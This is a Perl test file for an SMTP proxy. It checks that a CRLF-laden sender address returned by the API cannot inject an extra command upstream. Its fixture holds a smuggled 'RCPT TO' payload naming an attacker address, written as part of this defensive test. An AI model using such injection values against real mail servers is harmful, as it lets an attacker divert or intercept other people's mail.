use FindBin;
use lib "$FindBin::Bin";
use lib "$FindBin::Bin/../lib";
use lib "$FindBin::Bin/../thirdparty/lib/perl5";
use strict;
use warnings;
use Mojo::Base -strict, -signatures;

use FakeAPI;
use Mojo::IOLoop;
use Mojo::IOLoop::Server;
use Mojo::Log;
use Mojo::Promise;
use RawSMTPClient;
use RecordingSMTPServer;
use SMTPProxy;
use Test::More;

# Addresses that came from the client are sanitised by the command parser,
# which is the proxy's stated single point of validation for anything that ends
# up on an upstream command line. The address the API may substitute for the
# envelope sender never passes through it: it arrives as a JSON string and is
# interpolated straight into MAIL FROM:<...>, and the vendored client appends
# CRLF and writes it without looking. A CR or LF in that string is therefore a
# whole extra command injected into an authenticated upstream session.

plan tests => 4;

my $TEST_HOST = '127.0.0.1';
my $PROXY_PORT = Mojo::IOLoop::Server->generate_port;

my $upstream = RecordingSMTPServer->new(
    port => Mojo::IOLoop::Server->generate_port,
);
$upstream->start;

SMTPProxy->new(
    log => Mojo::Log->new(level => $ENV{TEST_LOG_LEVEL} // 'fatal'),
    listen => [$TEST_HOST . ':' . $PROXY_PORT],
    tohost => $TEST_HOST,
    toport => $upstream->port,
    tls_cert => "$FindBin::Bin/certs-and-keys/server.crt",
    tls_key => "$FindBin::Bin/certs-and-keys/server.key",
    api => FakeAPI->new(result => {
        allow   => 1,
        headers => [],
        from    => "innocent\@foobar.com>\r\nRCPT TO:<attacker\@evil.example",
    }),
    service_name => 'smtp.proxy.service',
)->setup;

my $outcome;
my $client = RawSMTPClient->new(address => $TEST_HOST, port => $PROXY_PORT);
$client->connect_p
    ->then(sub { $client->command_p('EHLO test.client') })
    ->then(sub { $client->command_p('STARTTLS') })
    ->then(sub { $client->startTLS_p })
    ->then(sub { $client->command_p('EHLO test.client') })
    ->then(sub { $client->authPlain_p('fooser', 's3cr3t') })
    ->then(sub { $client->command_p('MAIL FROM:<sender@foobar.com>') })
    ->then(sub { $client->command_p('RCPT TO:<rcpt@foobaz.com>') })
    ->then(sub { $client->command_p('DATA') })
    ->then(sub {
        $client->writeOnly("Subject: x\r\nFrom: a\@b.com\r\n\r\nbody\r\n.\r\n");
        return $client->expectReply_p;
    })
    ->then(sub ($r) { $outcome = $r; $client->close; return })
    ->catch(sub ($err) { fail "Session failed: $err" })
    ->finally(sub { Mojo::IOLoop->stop });
Mojo::IOLoop->start;

is_deeply $upstream->commandsMatching(qr/attacker/), [],
    'No injected command reaches the upstream';
is_deeply [grep { /^MAIL FROM/i && !/^MAIL FROM:<sender\@foobar\.com>/ }
        @{$upstream->commands}], [],
    'No malformed MAIL FROM line is written upstream';

like $outcome, qr/^5\d\d /, 'The client is told the message was not accepted';
unlike $outcome, qr/^250 /, 'The message is not reported as delivered';
